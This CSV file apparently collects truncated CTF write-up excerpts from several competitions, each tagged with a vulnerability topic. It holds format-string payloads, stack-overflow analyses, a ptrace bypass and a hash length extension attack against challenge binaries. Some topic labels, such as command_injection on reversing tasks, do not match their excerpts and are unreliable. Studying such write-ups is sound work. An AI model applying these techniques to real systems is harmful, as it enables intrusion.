dataset,identifier,repo,relative_path,title,topic,excerpt
ctf_writeup,writeups-36,writeups,defcamp-quals-2015/reverse/r200/sudhackar/README.md,sudhackar,command_injection,"[](ctf=defcamp-quals-2015) [](type=reverse) [](tags=hardcoded) We are given a [binary](../r200.bin). ```bash $ file r200.bin r200.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=22e68980e521b43c90688ed0693df78150b10211, stripped ``` This one has the same ptrace protection as in [r100](../../r100).We use the same technique to bypass ptrace check. ```bash gdb-peda$ b *0x40087d Breakpoint 1 at 0x40087d gdb-peda$ r . . gdb-peda$ set $rax=0 ``` Now the decompiling doesn't help much. We move to manually testing the flow path of binary. ```asm mov DWORD PTR [rbp-0x20],0x5 mov DWORD PTR [rbp-0x1c],0x2 mov DWORD PTR [rbp-0x18],0x7 mov DWORD PTR [rbp-0x14],0x2 mov DWORD PTR [rbp-0x10],0x5 mov DWORD PTR [rbp-0xc],0x6 ``` This seems interesting. A little bit of analysis shows ```bash 0x4007af: mov rax,QWORD PTR [rip+0x2008ca] # 0x601080 ``` On examining memory at 0x601080 and nearby areas we see the obvious. ```bash gdb-peda$ x/2xw 0x602010 0x602010: 0x00000001 0x0000006e gdb-peda$ x/2xw 0x602030 0x602030: 0x00000002 0x0000006f gdb-peda$ x/2xw 0x602050 0x602050: 0x00000003 0x00000070 gdb-"
ctf_writeup,writeups-37,writeups,defcamp-quals-2015/exploit/e100/sudhackar/README.md,sudhackar,buffer_overflow,"[](ctf=defcamp-quals-2015) [](type=exploit) [](tags=buffer-overflow) We are given a [binary](../e100.bin) and a [key](../id_rsa_e100). ```bash $ file e100.bin e100.bin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4410355efef2e99ac54e4028dba1b3e40d055fee, stripped ``` Also loading in gdb-peda. ```bash gdb-peda$ checksec CANARY : ENABLED FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial ``` Good. Loading the binary in [Hopper](http://www.hopperapp.com/) and decompiling. ```c function sub_80484fd { var_C = *0x14; printf(""Enter password: ""); gets(var_2C); if (arg0 == 0xbadb0169) { system(""cat flag""); } else { for (var_30 = 0x0; var_30 < strlen(var_2C); var_30 = var_30 + 0x1) { *(int8_t *)(var_30 + var_2C) = arg0 ^ *(int8_t *)(var_30 + var_2C) & 0xff; } printf(""Your new secure password is: ""); printf(var_2C); } eax = var_C ^ *0x14; COND = eax == 0x0; if (!COND) { eax = __stack_chk_fail(); } return eax; } ``` So a gets and a static hardcoded check. Basic buffer overflow!! ```bash 0x804851b: lea eax,[ebp-0x2c] 0x804851e: mov DWORD PTR [esp],eax => 0x8048521: call 0x80483a0 <g"
ctf_writeup,writeups-38,writeups,csaw-quals-2015/recon/alexander-taylor/chaitan94/README.md,chaitan94,other,"[](ctf=csaw-quals-2015) [](type=recon) [](tags=googling) [](tools=) [](techniques=) # Alexander Taylor (recon-100) This question has a series of small tasks. ### Task 1 To start off, we're given the link http://fuzyll.com/csaw2015/start > Part 1 of ?: Oh, good, you can use HTTP! The next part is at /csaw2015/<the acronym for my universitys hacking club>. By googling ""Alexander Taylor"", we find his LinkedIn page: https://www.linkedin.com/in/fuzyll We see ""President of the Whitehatters Computer Security Club"" That takes to the next task: http://fuzyll.com/csaw2015/wcsc ### Task 2 > CSAW 2015 FUZYLL RECON PART 2 OF ?: TmljZSB3b3JrISBUaGUgbmV4dCBwYXJ0IGlzIGF0IC9jc2F3MjAxNS88bXkgc3VwZXIgc21hc2ggYnJvdGhlcnMgbWFpbj4uCg== ```bash $ echo ""TmljZSB3b3JrISBUaGUgbmV4dCBwYXJ0IGlzIGF0IC9jc2F3MjAxNS88bXkgc3VwZXIgc21hc2ggYnJvdGhlcnMgbWFpbj4uCg=="" | base64 -d Nice work! The next part is at /csaw2015/<my super smash brothers main>. ``` So googled ""Alexander Taylor Super Smash Brothers"", nothing useful in the first page.. Googled for ""fuzyll Super Smash Brothers"", found a YouTube video titled ""Smash 4 Monthly (July 2015) - Fuzyll (Yoshi) vs. AgentZ ..."" That takes us to next part: http://fuzyll.com/cs"
ctf_writeup,writeups-39,writeups,csaw-quals-2015/pwn/precision/sudhackar/README.md,sudhackar,command_injection,"[](ctf=csaw-quals-2015) [](type=pwn) [](tags=stack-cookie,buffer-overflow) We are given a [file](../precision_a8f6f0590c177948fe06c76a1831e650) ```bash $ file precision_a8f6f0590c177948fe06c76a1831e650 precision_a8f6f0590c177948fe06c76a1831e650: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=929fc6f283d6f6c3c039ee19bc846e927103ebcd, not stripped ``` Lets disass main ```objdump 0x0804851d <+0>: push ebp 0x0804851e <+1>: mov ebp,esp 0x08048520 <+3>: and esp,0xfffffff0 0x08048523 <+6>: sub esp,0xa0 0x08048529 <+12>: fld QWORD PTR ds:0x8048690 0x0804852f <+18>: fstp QWORD PTR [esp+0x98] 0x08048536 <+25>: mov eax,ds:0x804a040 0x0804853b <+30>: mov DWORD PTR [esp+0xc],0x0 0x08048543 <+38>: mov DWORD PTR [esp+0x8],0x2 0x0804854b <+46>: mov DWORD PTR [esp+0x4],0x0 0x08048553 <+54>: mov DWORD PTR [esp],eax 0x08048556 <+57>: call 0x8048400 <setvbuf@plt> 0x0804855b <+62>: lea eax,[esp+0x18] 0x0804855f <+66>: mov DWORD PTR [esp+0x4],eax 0x08048563 <+70>: mov DWORD PTR [esp],0x8048678 0x0804856a <+77>: call 0x80483b0 <printf@plt> 0x0804856f <+82>: lea eax,[esp+0x18] 0x08048573 <+86>: mov DWORD PTR"
ctf_writeup,writeups-40,writeups,csaw-quals-2015/forensics/flash/chaitan94/README.md,chaitan94,other,"[](ctf=csaw-quals-2015) [](type=forensics) [](tags=) [](tools=) [](techniques=) # Flash (forensics-100) This was surprisingly very easy problem. After downloading the given [.img file](https://drive.google.com/file/d/0B_zt1fDAjfM_ZHJkSjdTYThPdmc/view), just running _strings_ on it gives away the flag: ```bash $ strings flash_c8429a430278283c0e571baebca3d139.img | grep flag{ ``` Aaand there's our flag: > flag{b3l0w_th3_r4dar}"
ctf_writeup,writeups-41,writeups,csaw-quals-2015/forensics/transfer/sudhackar/README.md,sudhackar,other,"[](ctf=csaw-quals-2015) [](type=forensics) [](tags=packet,) [](tools=wireshark) [](techniques=) We are given a [pcap]() file. On viewing in Wireshark and looking around we see some python code. Follow the TCP stream to get [file](../transfer.py) ```python import string import random from base64 import b64encode, b64decode FLAG = 'flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}' enc_ciphers = ['rot13', 'b64e', 'caesar'] # dec_ciphers = ['rot13', 'b64d', 'caesard'] def rot13(s): _rot13 = string.maketrans(""ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz"",""NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm"") return string.translate(s, _rot13) def b64e(s): return b64encode(s) def caesar(plaintext, shift=3): alphabet = string.ascii_lowercase shifted_alphabet = alphabet[shift:] + alphabet[:shift] table = string.maketrans(alphabet, shifted_alphabet) return plaintext.translate(table) def encode(pt, cnt=5): tmp = '2{}'.format(b64encode(pt)) for cnt in xrange(cnt): c = random.choice(enc_ciphers) i = enc_ciphers.index(c) + 1 _tmp = globals()[c](tmp) tmp = '{}{}'.format(i, _tmp) print tmp,c,i return tmp if __name__ == '__main__': print encode(FLAG) #2Mk16Sk5iakYxVFZoS1RsWnZXbFZaYjFaa1prWmFkMDVWVG"
ctf_writeup,writeups-42,writeups,csaw-quals-2015/crypto/whiter0se/chaitan94/README.md,chaitan94,other,"[](ctf=csaw-quals-2015) [](type=crypto) [](tags=cryptogram) [](tools=rumkin) [](techniques=) # whiter0se (crypto-50) We are given the cipher text: EOY XF, AY VMU M UKFNY TOY YF UFWHYKAXZ EAZZHN. UFWHYKAXZ ZNMXPHN. UFWHYKAXZ EHMOYACOI. VH'JH EHHX CFTOUHP FX VKMY'U AX CNFXY FC OU. EOY VH KMJHX'Y EHHX IFFQAXZ MY VKMY'U MEFJH OU. Could this be ceasar cipher? Let's check all 26 shifts: ``` yis rzz us pgo g oezhs nis sz ozqbseurt yuttbhb ozqbseurt thgrjbhb ozqbseurt ybgisuwicb pbudb ybbr wzniobj zr pegsuo ur whzrs zw iob yis pb egdbrus ybbr czzkurt gs pegsuo gyzdb iob zjt saa vt qhp h pfait ojt ta parctfvsu zvuucic parctfvsu uihskcic parctfvsu zchjtvxjdc qcvec zccs xaojpck as qfhtvp vs xiast ax jpc zjt qc fhecsvt zccs daalvsu ht qfhtvp hzaec jpc aku tbb wu riq i qgbju pku ub qbsdugwtv awvvdjd qbsdugwtv vjitldjd qbsdugwtv adikuwyked rdwfd addt ybpkqdl bt rgiuwq wt yjbtu by kqd aku rd gifdtwu addt ebbmwtv iu rgiuwq iabfd kqd blv ucc xv sjr j rhckv qlv vc rctevhxuw bxwweke rctevhxuw wkjumeke rctevhxuw bejlvxzlfe sexge beeu zcqlrem cu shjvxr xu zkcuv cz lre blv se hjgeuxv beeu fccnxuw jv shjvxr jbcge lre cmw vdd yw tks k sidlw rmw wd sdufwiyvx cyxxflf sdufwiyvx xlkvnflf sdufwiyvx cfkmwyamgf "
ctf_writeup,writeups-43,writeups,tum-ctf-teaser-2015/pwn/greeter/sudhackar/README.md,sudhackar,format_string,"[](ctf=tum-ctf-teaser-2015) [](type=pwn) [](tags=format-string) #greeter (pwn 15) ```bash $ file ./greeter ./greeter: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2657dbbc9fbf7a266d2d963b4644d1c3b44d8304, not stripped ``` So we have a not stripped file. ```bash $ ./greeter Hi, what's your name? AAAAA Pwn harder, AAAAA! ``` We can send in a name. It suffers form format string vulnerability. ``` $ ./greeter Hi, what's your name? %x.%x Pwn harder, b5eeae30.7227d7a0! ``` A little bit of analysis shows that the file reads in flag.txt to an address called flag which is not on the stack. Its on the heap. Since it is not on the stack we can't use repeated %x to read it. Also since the file is not stripped we can see the locations of each variable. ```bash gdb-peda$ p &flag $1 = (char (*)[256]) 0x600ca0 <flag> ``` %s is a format specifier that prints out a string ftarting from a given pointer. Now just figure out the offset. ```bash $ python -c 'print ""%x%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.AAAA""' | ./greeter Hi, what's your name? Pwn harder, ffa0b88010c3b7a0.1096f620.10"
ctf_writeup,writeups-44,writeups,tum-ctf-teaser-2015/rev/whitebox crypto/sudhackar/README.md,sudhackar,command_injection,"[](ctf=tum-ctf-teaser-2015) [](type=rev) [](tags=xtea) [](tool=pwntools) # whitebox crypto (rev 20) So we have an [executable](../xtea) Problem statement ``` Do not panic, it's only XTEA! I wonder what the key was... ``` Little bit of google we get this piece of code from [Wikipedia](https://en.wikipedia.org/wiki/XTEA) ```c void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9; for (i=0; i < num_rounds; i++) { v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]); sum += delta; v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]); } v[0]=v0; v[1]=v1; } ``` Given file ```bash $ file ./xtea ./xtea: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=331f96cc8eefbf07d5752cf9e8cf4facb32ba8ff, not stripped ``` A little bit of analysis shows we have to give something as argv[1] of length 16 as input ```bash $ ./xtea AAAAAAAAAAAAAAAA 4a584fe6 116e650b ``` It returns the input ""encrypted"". We have to find the key. The code from Wikipedia says key[4] would be having 4 blocks of length "
ctf_writeup,writeups-45,writeups,tum-ctf-teaser-2015/crypto/bad_apple/sudhackar/README.md,sudhackar,other,"[](ctf=tum-ctf-teaser-2015) [](type=crypto) [](tags=hash-length-extension-attack) [](tool=hashpump) # bad_apple (crypto 15) ``` Baby's 1st ctf.link/assets/downloads/cry/bad_apple.tar.xz try: ncat 1.ctf.link 1027 < good.bin expect: ""hello"" ``` We are given a [tar archive](../bad_apple.tar.xz) It has a python file which is probably the source of the service ```python #!/usr/bin/env python3 import sys, binascii from Crypto.Hash import SHA256 key = open('key.bin', 'rb').read() message = sys.stdin.buffer.read(0x100) if len(message) < SHA256.digest_size: print('len') exit(0) tag, message = message[:SHA256.digest_size], message[SHA256.digest_size:] if SHA256.new(key + message).digest() != tag: print('bad') exit(0) if b'hello pls' in message: print('hello') if b'flag pls' in message: print(open('flag.txt', 'r').read()) ``` Also ```bash $ xxd good.bin 0000000: 2628 455f 6617 ecea 0248 95a4 8578 ebce &(E_f....H...x.. 0000010: 00fa 9204 983d 09b6 d175 7d05 dc43 0567 .....=...u}..C.g 0000020: 6865 6c6c 6f20 706c 73 hello pls ```` We see that the service uses sha256 to verify the signature and then process the message. We can use hash [Length Extension Attack](https://en.wikipedia.org/wiki/Leng"
ctf_writeup,writeups-46,writeups,whitehat-grand-prix-quals-2015/reversing/dong wan/sudhackar/README.md,sudhackar,format_string,"[](ctf=whitehat-grand-prix-quals-2015) [](type=analysis,reverse) [](tags=base64) [](tools=gdb-peda) [](techniques=) #Dong Van (RE - 100) So we have a [zip](../re100_35d14595b17756b79556f6eca775c31a.zip). ```bash $ file Re100 Re100: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=6c7c0504ab2f342427f59846298e97f9e4fbb98f, not stripped $ ./Re100 Input your secret: AAAA Too bad :( ``` So its checking for a password. A strings on the binary will tell us. ```bash $ strings ./Re100 . . stoull %llu ELF8n0BKxOCbj/WU9mwle4cG6hytqD+P3kZ7AzYsag2NufopRSIVQHMXJri51Tdv 0000 Input your secret: ms4otszPhcr7tMmzGMkHyFn= Good boy! Submit your flag :) Too bad :( . . ``` We see some base64 here. But it doesn't work. So we'll load it up in gdb. When we run it we see the input we pass is given on to a function change() and the output is matched with ms4otszPhcr7tMmzGMkHyFn=. So this uses a custom encoding technique. Stepping through the program we see that the program uses 'ELF8n0BKxOCbj/WU9mwle4cG6hytqD+P3kZ7AzYsag2NufopRSIVQHMXJri51Tdv' as its character set in the same fasion as normal Base64. So we wr"
ctf_writeup,writeups-47,writeups,teaser-dragon-ctf-2019/misc/PlayCAP/jaiverma/README.md,jaiverma,other,"[](ctf=teaser-dragon-ctf-2019) [](type=misc) [](tags=pcap,html5,usb) [](tools=wireshark,tshark) # PlayCAP We are given an [HTML5 application](../app.html) and a [pcagng](../PlayCAP.pcapng). The packet capture file has a bunch of USB traffic (`URB Interrupt` packets). More information about the USB filter fields can be found at the [Wireshark USB reference page](https://www.wireshark.org/docs/dfref/u/usb.html). ```sh $ tshark -r ../PlayCAP.pcapng -V | less Frame 1: 36 bytes on wire (288 bits), 36 bytes captured (288 bits) on interface 0 Interface id: 0 (\\.\pipe\wireshark_extcap_\\.\USBPcap1_20190918154451) Interface name: \\.\pipe\wireshark_extcap_\\.\USBPcap1_20190918154451 Encapsulation type: USB packets with USBPcap header (152) Arrival Time: Sep 18, 2019 19:16:10.716963000 IST [Time shift for this packet: 0.000000000 seconds] Epoch Time: 1568814370.716963000 seconds [Time delta from previous captured frame: 0.000000000 seconds] [Time delta from previous displayed frame: 0.000000000 seconds] [Time since reference or first frame: 0.000000000 seconds] Frame Number: 1 Frame Length: 36 bytes (288 bits) Capture Length: 36 bytes (288 bits) [Frame is marked: False] [Frame is ignored: F"
ctf_writeup,writeups-48,writeups,utctf-2020/pwn/bof/jaiverma/README.md,jaiverma,buffer_overflow,"[](ctf=utctf-2020) [](type=pwn) [](tags=buffer-overflow) [](tools=gdb,python) # bof We are given an `x86_64` [binary](../pwnable) with a simple stack based buffer overflow. The binary is compiled with `NX` enabled. ```sh gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial ``` There is a function `get_flag` which spawns a shell if given `0xdeadbeef` as an argument in `rdi`. ```asm gdb-peda$ disass get_flag Dump of assembler code for function get_flag: 0x00000000004005ea <+0>: push rbp 0x00000000004005eb <+1>: mov rbp,rsp 0x00000000004005ee <+4>: sub rsp,0x20 0x00000000004005f2 <+8>: mov DWORD PTR [rbp-0x14],edi 0x00000000004005f5 <+11>: cmp DWORD PTR [rbp-0x14],0xdeadbeef 0x00000000004005fc <+18>: jne 0x400628 <get_flag+62> 0x00000000004005fe <+20>: mov QWORD PTR [rbp-0x10],0x400700 0x0000000000400606 <+28>: mov QWORD PTR [rbp-0x8],0x0 0x000000000040060e <+36>: mov rax,QWORD PTR [rbp-0x10] 0x0000000000400612 <+40>: lea rcx,[rbp-0x10] 0x0000000000400616 <+44>: mov edx,0x0 0x000000000040061b <+49>: mov rsi,rcx 0x000000000040061e <+52>: mov rdi,rax 0x0000000000400621 <+55>: call 0x400490 <execve@plt> 0x0000000000400626 <+60>: jmp 0x400629"
ctf_writeup,writeups-49,writeups,utctf-2020/pwn/zurk/jaiverma/README.md,jaiverma,format_string,"[](ctf=utctf-2020) [](type=pwn) [](tags=format-string,shellcode) [](tools=gdb,pwntools,python) # zurk We are given a [binary](../pwnable) and [libc](../libc-2.23.so). The binary has a format string vulnerability and it has lots of exectuable regions. ```sh gdb-peda$ vmmap Start End Perm Name 0x00400000 0x00401000 r-xp /home/jai/Documents/ctf/utctf/pwn/zurk/pwnable 0x00600000 0x00601000 r-xp /home/jai/Documents/ctf/utctf/pwn/zurk/pwnable 0x00601000 0x00602000 rwxp /home/jai/Documents/ctf/utctf/pwn/zurk/pwnable 0x00007ffff7dce000 0x00007ffff7f8a000 r-xp /usr/lib/libc-2.31.so 0x00007ffff7f8a000 0x00007ffff7f8d000 r-xp /usr/lib/libc-2.31.so 0x00007ffff7f8d000 0x00007ffff7f90000 rwxp /usr/lib/libc-2.31.so 0x00007ffff7f90000 0x00007ffff7f96000 rwxp mapped 0x00007ffff7fcd000 0x00007ffff7fd0000 r--p [vvar] 0x00007ffff7fd0000 0x00007ffff7fd1000 r-xp [vdso] 0x00007ffff7fd1000 0x00007ffff7ffb000 r-xp /usr/lib/ld-2.31.so 0x00007ffff7ffc000 0x00007ffff7ffd000 r-xp /usr/lib/ld-2.31.so 0x00007ffff7ffd000 0x00007ffff7ffe000 rwxp /usr/lib/ld-2.31.so 0x00007ffff7ffe000 0x00007ffff7fff000 rwxp mapped 0x00007ffffffde000 0x00007ffffffff000 rwxp [stack] 0xffffffffff600000 0xffffffffff601000 --xp [vsysca"
ctf_writeup,writeups-50,writeups,utctf-2020/reverse/basics_reverse_engineering/jaiverma/README.md,jaiverma,other,[](ctf=utctf-2020) [](type=reversing) [](tags=strings) [](tools=strings) # [Basics] Reverse Engineering Running `strings` on the binary gives us the flag. ``` $ strings calc ... utflag{str1ngs_1s_y0ur_fr13nd} ... ```
ctf_writeup,writeups-51,writeups,utctf-2020/reverse/png2/jaiverma/README.md,jaiverma,other,"[](ctf=utctf-2020) [](type=reversing) [](tags=png) [](tools=PIL,python,xxd) # PNG2 We are given a [binary file](../pic.png2). ``` $ xxd pic.png2 | head 00000000: 504e 4732 7769 6474 683d 05cf 6865 6967 PNG2width=..heig 00000010: 6874 3d02 887f 7f7f 7f7f 7f7f 7f7f 7f7f ht=............. 00000020: 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f ................ 00000030: 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f ................ 00000040: 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f ................ 00000050: 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f ................ 00000060: 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f ................ 00000070: 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f ................ 00000080: 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f ................ 00000090: 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f ................ ``` Reading the `width` and `height` as big endian `uint16's` and passing the pixel data to `PIL` gives us the image. Script is [here](./solve.py). ![](./flag.png)"
ctf_writeup,writeups-52,writeups,utctf-2020/reverse/babymips/jaiverma/README.md,jaiverma,other,"[](ctf=utctf-2020) [](type=reversing) [](tags=mips) [](tools=ghidra) # babymips We are given a `MIPS` [binary](../baby). Opening the binary in `Ghidra` in decompiler view gives us the simple algorithm used to compare our input against bytes stored in the binary. ```py from pwn import * e = ELF('./baby') buf = e.read(0x4015f4, 0x54) s = bytearray(0x4e) for i in range(0x4e): x = buf[i] ^ (i + 0x17) s[i] = x print(bytes(s).decode('utf-8')) ```"
ctf_writeup,writeups-53,writeups,whitehat-contest-11-2016/RE/RE3/sudhackar/README.md,sudhackar,command_injection,"[](ctf=whitehat-contest-11-2016) [](type=rev) [](tags=py2exe) [](tool=unpy2exe) # RE3 (rev 100) So we have an [exe file](../digital_fortrees.exe) ```bash $ file digital_fortrees.exe digital_fortrees.exe: PE32 executable (console) Intel 80386, for MS Windows $ strings digital_fortrees.exe !This program cannot be run in DOS mode. . . <pythondll> LoadLibrary(pythondll) failed . ``` This suggests the executable was made using [py2exe](http://www.py2exe.org/). Byte compiled pyc files can be easily fished out from such exe using [unpy2exe](https://github.com/matiasb/unpy2exe). We take out the pyc file and then use [Easy Python Decompiler](https://sourceforge.net/projects/easypythondecompiler/) to get ```python # Embedded file name: digital_fortrees.py import urllib2 def main(): print "" /\\\n /`:\\\n /`'`:\\\n /`'`'`:\\\n /`'`'`'`:\\\n /`'`'`'`'`:\\\n |`'`'`'`:|\n _ _ _ _ _ |] ,-. :|_ _ _ _\n ||| || || || | | |_| ||| || || || |\n |`' `' `' `'.| | _'=' |`' `' `' `'.|\n : .:; |'-' : .:;\n \\-..____..:/ _ _ _ _ _ _| _ _'-\\-..____..:/\n :--------:_,' || || || || || || || `.::--------:\n |] .:|:. `' `'_`' `' `' `' `' | '-' .:|\n | ,-. .[|:._ '-' ____ ___ | ,-.'-|\n | | | .:|'--'_ ,'____`. '--"
ctf_writeup,writeups-54,writeups,whitehat-contest-11-2016/RE/RE1/abishek/README.md,abishek,other,[](ctf=whitehat-contest-11-2016) [](type=rev) [](tool=IDApro) # RE3 (rev 100) We're given the Binary. When opened and analysed with IDA and exported the C file we come across the code line below. ![bump](files/code.png) Thus understanding the codeline yields the following to be the tokens. 1.{53fc275d81daf29f5903053ed5be8c4938ae4efd} 2.{53fc275d81053ed5be8cdaf29f59034938ae4efd} When input the token results True which gives the flag. ![bump](files/terminal.png)
ctf_writeup,writeups-55,writeups,plaid-ctf-2020/web/contrived/zevtnax/README.md,zevtnax,command_injection,"# [Web] Contrived Web Problem - 350 *Warning*: This writeup is a creation of my lonely quarantined mind. It may be longer than required. If you're busy, jump to [the Attack Plan](#The-Attack-Plan). This was an exciting challenge in PlaidCTF 2020. Let's dive right in! The source code for a web app is given: ![](https://i.imgur.com/utcVnKb.png) As you can see, there are 6(!) services. Before going through all of them, I quickly grepped for `flag`: ![](https://i.imgur.com/sKPPDeM.png) Aha! Now we know where the flag is. It's in the `/flag.txt` file in the services which use the `services.dockerfile` Dockerfile. A quick look into `docker-compose.yml` reveals that only `api`, `server` and `email` services use this dockerfile. So, it's clear that only these services can read the flag. This will come in handy. ## Exploration Let's get a broad overview of what the services do: - The **api** service has the following endpoints: - `/register` - allows the user to create an account - `/login` - allows the user to login - `/password-reset` - sends the password and email it to the user - `/self` - returns info. about logged in user - `/profile` - Allows user to upload a profile image. The image"
ctf_writeup,writeups-56,writeups,b01lers-ctf-2020/pwn/department_of_flying_vehicles/jaiverma/README.md,jaiverma,buffer_overflow,"[](ctf=b01lers-ctf-2020) [](type=pwn) [](tags=buffer-overflow) [](tools=ida) # department of flying vehicles We are given a [binary](../dfv) which has a buffer overflow due to a call to `gets`. The program reads user input and xors it with a key. It then compares that to a hardcoded value. Basically it does the following: ```python xor_key = 0x1052949205934052 xor_value = 0x5641444C4F4F43 # hex for 'COOLDAV' xor_result = xor_key ^ xor_value s = gets() # buffer overflow here if (s ^ xor_result != xor_value): # fail else: # checks if the first 8 characters of our input are # 'COOLDAV\x00' using strncmp # if they aren't we get the flag! ``` ![](./ida.png) Using the buffer overflow, we can modify the `xor_key`, `xor_value`, and `xor_result` to make `strncmp` to fail and give us the flag. Running the [solver script](./solve.py) ```sh $ python solve.py [+] Opening connection to pwn.ctf.b01lers.com on port 1001: Done b""\nIf you can please make it work, we'll reward you!\n\nWelcome to the Department of Flying Vehicles.\nWhich liscense plate would you like to examine?\n > "" b""Thank you so much! Here's your reward!\npctf{sp4c3_l1n3s_R_sh0r7!}\n"" ```"
ctf_writeup,writeups-57,writeups,b01lers-ctf-2020/pwn/xwing_part1/jaiverma/README.md,jaiverma,other,"[](ctf=b01lers-ctf-2020) [](type=pwn) [](tags=misc) [](tools=) # X-Wing Part 1 This was more of a misc challenge than a pwn. We are given a link to a YouTube video. The video contains a link to a URL which has the actual challenge. You can see the link here: - [https://youtu.be/bYAoGTywR5c?t=3](https://youtu.be/bYAoGTywR5c?t=3) - [http://xwing.pwn.ctf.b01lers.com/](http://xwing.pwn.ctf.b01lers.com/) Viewing the source of this page, there is a `Dockerfile`. ```Dockerfile FROM archlinux:20200106 # Change example to the name of your challenge. ENV USER xwing WORKDIR /home/$USER RUN useradd -ms /bin/bash $USER RUN pacman -Sy gcc make xinetd --noconfirm COPY $USER.xinetd /etc/rc.d/$USER COPY $USER.c /home/$USER/ COPY memdump.c /home/$USER/ COPY memdump.h /home/$USER/ COPY $USER.Makefile /home/$USER/Makefile COPY $USER.sh /home/$USER/$USER.sh COPY flag1.txt /home/$USER/flag1.txt COPY flag2.txt /home/$USER/flag2.txt COPY flag3.txt /home/$USER/flag3.txt COPY flag4.txt /home/$USER/flag4.txt RUN make -C /home/$USER/ RUN chown -R root:$USER /home/$USER RUN chmod -R 550 /home/$USER RUN chmod -x /home/$USER/flag1.txt RUN chmod -x /home/$USER/flag2.txt RUN chmod -x /home/$USER/flag3.txt RUN chmo"
